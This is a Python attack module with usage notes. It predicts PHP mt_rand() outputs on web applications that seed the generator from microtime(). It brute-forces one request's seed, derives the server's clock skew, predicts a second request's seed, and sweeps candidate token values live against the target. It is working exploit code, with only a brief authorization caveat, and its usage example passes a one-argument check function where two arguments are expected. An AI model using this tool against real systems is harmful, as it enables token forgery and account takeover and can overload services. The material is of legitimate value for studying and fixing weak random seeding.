"""
USAGE
    Use this tool against a web application that seeds PHP's mt_rand() from
    microtime() on every request and exposes at least two mt_rand() outputs
    through a verifiable channel on one request (for example two tokens
    reflected in a page, or two values whose hash is reflected). The tool
    recovers the exact seed of that request, then uses the recovered seed
    together with precise request timing to predict the mt_rand() seed of a
    second, closely timed request whose output is not directly verifiable,
    so that output can be tested live against the server.

    Import the functions you need:
        from mt19937_microtime_prediction import (
            PhpMt19937,
            first_two_outputs_batch,
            recover_seed,
            predict_second_seed,
            candidates_by_radius,
        )

HOW IT WORKS
    PHP's mt_rand() is a Mersenne Twister (MT19937) PRNG. When an
    application seeds it with mt_srand(microtime()) style code, the seed is
    built from the Unix timestamp and the microsecond fraction of the
    request's wall clock time, so the seed space for a given request is
    only about a few million values wide (one value per microsecond across
    a handful of candidate seconds). That is small enough to brute force
    offline in a few seconds with a vectorized search, provided at least
    two consecutive mt_rand() outputs from that seed can be checked against
    something the server reveals (recover_seed does this).

    Once the exact seed of one request is known, comparing that seed's
    encoded timestamp to the attacker's local clock at send time gives the
    clock offset between attacker and server. Critically, that offset must
    be computed from the midpoint of the request's round trip, not from
    the moment the request was sent, otherwise the request's own one way
    network latency leaks into the offset as an uncorrected bias. Using
    the midpoint cancels that bias under the usual assumption that the
    path latency is roughly symmetric.

    That clock offset can then be applied to a second request's send time
    to predict the server's wall clock, and therefore the second request's
    mt_rand() seed, to within a small uncertainty window driven by network
    jitter. Because the seed cannot be verified offline this time, the
    candidates nearest the predicted center are tested live against the
    server, closest first, until one succeeds or the search budget is
    exhausted.

RUN
    This module exposes building blocks rather than a single command line
    entry point, because the oracle check, the live test request, and the
    request timing all depend on the target application. A typical driver
    looks like this:

        import time, hashlib
        import numpy as np

        t_before = time.time()
        page = send_request_that_reveals_two_outputs()
        t_after = time.time()
        output_a, output_b = extract_two_values(page)

        seed1 = recover_seed(
            lambda candidate_outputs: (
                hash_fn(candidate_outputs[0]) == output_a and
                hash_fn(candidate_outputs[1]) == output_b
            ),
            t_before, t_after,
        )

        t2_before = time.time()
        send_second_request()
        t2_after = time.time()

        predicted_seed, radius = predict_second_seed(
            seed1, t_before, t_after, t2_before, t2_after,
        )

        for seed in candidates_by_radius(predicted_seed, radius):
            value = PhpMt19937(seed).mt_rand()
            if test_live(value):
                print("match:", seed)
                break

NOTES
    - first_two_outputs_batch requires numpy and processes candidate seeds
      in large vectorized batches; it is dramatically faster than calling
      PhpMt19937 in a Python loop once the candidate count passes a few
      thousand.
    - recover_seed widens its search window by a few seconds on each side
      of the observed request window to absorb clock skew; narrow that
      window once you have a rough idea of the skew to speed up repeated
      runs against the same target.
    - predict_second_seed returns a radius derived from the larger of the
      two requests' round trip times. Treat that radius as a starting
      point, not a guarantee: pick it to fit your live testing throughput
      and the server's token expiry window, and widen it only as far as
      your time budget allows.
    - Live testing throughput is limited by the target server, not by
      local concurrency. Raising concurrency past what the server can
      actually handle increases latency and error rates without raising
      throughput, and can make the service unresponsive for everyone,
      including yourself. Measure a safe concurrency level with a small
      trial before committing to a full sweep, and only use this against
      systems you are authorized to test.
"""

import hashlib

try:
    import numpy as np
except ImportError:
    np = None

N = 624
M = 397
MATRIX_A = 0x9908b0df
UPPER_MASK = 0x80000000
LOWER_MASK = 0x7fffffff
MASK32 = 0xffffffff


class PhpMt19937:
    """Reference implementation of PHP's mt_rand() (PHP 7.1+ semantics)."""

    def __init__(self, seed):
        self.mt = [0] * N
        self.mt[0] = seed & MASK32
        for i in range(1, N):
            prev = self.mt[i - 1]
            self.mt[i] = (1812433253 * (prev ^ (prev >> 30)) + i) & MASK32
        self.index = N

    def _reload(self):
        mt = self.mt
        for i in range(N):
            y = (mt[i] & UPPER_MASK) | (mt[(i + 1) % N] & LOWER_MASK)
            nxt = mt[(i + M) % N] ^ (y >> 1)
            if y & 1:
                nxt ^= MATRIX_A
            mt[i] = nxt
        self.index = 0

    def next32(self):
        if self.index >= N:
            self._reload()
        y = self.mt[self.index]
        self.index += 1
        y ^= y >> 11
        y ^= (y << 7) & 0x9d2c5680
        y ^= (y << 15) & 0xefc60000
        y ^= y >> 18
        return y & MASK32

    def mt_rand(self):
        return self.next32() >> 1


def first_two_outputs_batch(seeds):
    """Compute the first two mt_rand() outputs for many candidate seeds at once.

    seeds: a 1D array-like of integer seed values.
    Returns (r0, r1), two numpy uint32 arrays of the same length as seeds.
    Requires numpy.
    """
    if np is None:
        raise RuntimeError("numpy is required for first_two_outputs_batch")

    seeds = np.asarray(seeds, dtype=np.uint64) & np.uint64(MASK32)
    need = M + 2
    mt = np.empty((need, len(seeds)), dtype=np.uint64)
    mt[0] = seeds
    c = np.uint64(1812433253)
    for i in range(1, need):
        prev = mt[i - 1]
        mt[i] = (c * (prev ^ (prev >> np.uint64(30))) + np.uint64(i)) & np.uint64(MASK32)

    def twist(mt_i, mt_i1, mt_iM):
        y = (mt_i & np.uint64(UPPER_MASK)) | (mt_i1 & np.uint64(LOWER_MASK))
        nxt = mt_iM ^ (y >> np.uint64(1))
        lowbit = y & np.uint64(1)
        nxt = nxt ^ (lowbit * np.uint64(MATRIX_A))
        return nxt & np.uint64(MASK32)

    def temper(y):
        y = y ^ (y >> np.uint64(11))
        y = y ^ ((y << np.uint64(7)) & np.uint64(0x9d2c5680))
        y = y ^ ((y << np.uint64(15)) & np.uint64(0xefc60000))
        y = y ^ (y >> np.uint64(18))
        return y & np.uint64(MASK32)

    out0 = twist(mt[0], mt[1], mt[M])
    out1 = twist(mt[1], mt[2], mt[M + 1])
    r0 = (temper(out0) >> np.uint64(1)).astype(np.uint32)
    r1 = (temper(out1) >> np.uint64(1)).astype(np.uint32)
    return r0, r1


def recover_seed(check_fn, t_before, t_after, window_margin_seconds=3):
    """Recover the exact microtime()-derived seed of an observed request.

    check_fn: callable taking (output0, output1) as Python ints, returning
        True when both match what the server revealed for that request.
    t_before, t_after: local wall clock timestamps bracketing the request
        (time.time() immediately before sending it and immediately after
        receiving the response).
    window_margin_seconds: how many seconds of slack to add on each side
        of the observed window, to absorb clock skew between attacker and
        server.

    Returns the integer seed, or None if no match was found in the window.
    """
    if np is None:
        raise RuntimeError("numpy is required for recover_seed")

    sec_lo = int(t_before) - window_margin_seconds
    sec_hi = int(t_after) + window_margin_seconds
    chunk_size = 1_000_000
    for sec in range(sec_lo, sec_hi + 1):
        base = sec % (2 ** 32)
        seeds = np.arange(base, base + chunk_size, dtype=np.int64)
        r0, r1 = first_two_outputs_batch(seeds)
        for i in range(len(seeds)):
            if check_fn(int(r0[i]), int(r1[i])):
                return int(seeds[i])
    return None


def predict_second_seed(seed1, t1_before, t1_after, t2_before, t2_after,
                         radius_floor=40000, radius_cap=60000, jitter_factor=0.6):
    """Predict the seed of a second request from a recovered first seed.

    seed1: the exact seed recovered from the first request (see
        recover_seed).
    t1_before, t1_after: local timestamps bracketing the first request.
    t2_before, t2_after: local timestamps bracketing the second request.
    radius_floor, radius_cap: bounds, in microseconds, on the search radius
        returned alongside the predicted seed.
    jitter_factor: scales the larger of the two requests' round trip times
        into a radius estimate; raise it if live tests keep missing just
        outside the returned radius, lower it to search faster at the risk
        of missing the true seed.

    Returns (predicted_seed, radius). Candidates to test live are
    predicted_seed - radius .. predicted_seed + radius, ideally visited
    closest-first (see candidates_by_radius).
    """
    seed1_second = int(t1_before)
    seed1_usec = seed1 - seed1_second
    t_seed1 = seed1_second + seed1_usec / 1_000_000.0

    get_rtt = t1_after - t1_before
    get_mid = (t1_before + t1_after) / 2
    clock_skew = t_seed1 - get_mid

    post_rtt = t2_after - t2_before
    predicted_t = t2_before + clock_skew + post_rtt / 2
    predicted_sec = int(predicted_t)
    predicted_usec = int((predicted_t - predicted_sec) * 1_000_000)
    predicted_seed = (predicted_sec + predicted_usec) & MASK32

    jitter_hint = max(get_rtt, post_rtt)
    radius = min(max(radius_floor, int(jitter_hint * 1_000_000 * jitter_factor)), radius_cap)
    return predicted_seed, radius


def candidates_by_radius(center, radius):
    """Yield candidate seeds around center, closest first, out to radius.

    Returns a numpy array if numpy is available (recommended for use with
    first_two_outputs_batch), otherwise a plain Python list.
    """
    if np is not None:
        offsets = np.concatenate([np.arange(0, radius + 1), -np.arange(1, radius + 1)])
        order = np.argsort(np.abs(offsets))
        return (center + offsets[order]).astype(np.int64) & MASK32

    offsets = sorted(range(-radius, radius + 1), key=abs)
    return [(center + o) & MASK32 for o in offsets]


def md5_token(value):
    """Convenience helper: many targets hash a decimal mt_rand() output with md5."""
    return hashlib.md5(str(int(value)).encode()).hexdigest()
